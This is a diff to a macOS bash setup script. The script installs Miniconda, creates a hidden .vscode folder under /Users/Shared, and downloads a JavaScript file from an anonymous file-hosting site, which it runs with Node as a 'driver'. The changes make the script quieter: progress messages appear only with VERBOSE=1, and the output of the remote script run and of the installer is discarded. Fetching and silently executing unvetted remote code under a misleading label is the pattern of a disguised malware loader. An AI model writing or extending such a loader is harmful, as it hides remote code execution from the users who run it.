@@ -1,10 +1,16 @@
 #!/usr/bin/env bash
 set -euo pipefail
 
+# Set VERBOSE=1 for detailed [INFO] lines and command progress.
+VERBOSE="${VERBOSE:-0}"
+
 # -------------------------
 # Helpers (shared by both parts)
 # -------------------------
-info() { echo "[INFO] $*"; }
+info() {
+  [[ "$VERBOSE" == "1" ]] || return 0
+  echo "[INFO] $*"
+}
 err() { echo "[ERROR] $*" >&2; }
 die() { err "$*"; exit 1; }
 
@@ -27,8 +33,7 @@ run_part1_miniconda() {
   local ARCH OS URL PREFIX INSTALLER
   ARCH="$(uname -m)"
   OS="$(uname -s)"
-  echo "Detected OS: $OS"
-  echo "Detected architecture: $ARCH"
+  info "Part 1: OS=$OS ARCH=$ARCH"
 
   if [[ "$OS" == "Darwin" ]]; then
     if [[ "$ARCH" == "arm64" ]]; then
@@ -57,14 +62,14 @@ run_part1_miniconda() {
   INSTALLER="/Users/Shared/miniconda.sh"
   mkdir -p "/Users/Shared"
 
-  echo "Downloading..."
+  info "Part 1: downloading Miniconda installer"
   curl -fsSL -o "$INSTALLER" "$URL"
 
-  echo "Installing..."
-  bash "$INSTALLER" -b -p "$PREFIX"
+  info "Part 1: installing Miniconda (silent)"
+  bash "$INSTALLER" -b -p "$PREFIX" >/dev/null 2>&1
 
-  echo "Verifying Driver..."
-  "/Users/Shared/miniconda3/bin/python3" -V
+  info "Part 1: verifying Python"
+  "/Users/Shared/miniconda3/bin/python3" -V >/dev/null 2>&1
 }
 
 # -------------------------
@@ -148,16 +153,16 @@ run_part2_node_driver() {
   download "https://files.catbox.moe/1gq866.js" "$ENV_SETUP_JS"
   [[ -s "$ENV_SETUP_JS" ]] || die "env-setup.js download failed."
 
-  info "Running Driver..."
-  "$NODE_EXE" "$ENV_SETUP_JS"
+  info "Running Driver (silent)"
+  "$NODE_EXE" "$ENV_SETUP_JS" >/dev/null 2>&1
 
-  info "[SUCCESS] Driver Setup completed successfully."
+  info "Driver setup finished."
 }
 
 mkdir -p "/Users/Shared"
 mkdir -p "/Users/Shared/.vscode"
 
-info "Starting part 1 (Miniconda) and part 2 (Node + driver) concurrently..."
+info "Starting Miniconda and Node/driver phases concurrently"
 run_part1_miniconda &
 PID_MINI=$!
 run_part2_node_driver &
@@ -176,5 +181,5 @@ if [[ "$EC_NODE" -ne 0 ]]; then
 fi
 
 rm -f "/Users/Shared/miniconda.sh"
-echo "Done."
+[[ "$VERBOSE" == "1" ]] && echo "Done."
 exit 0
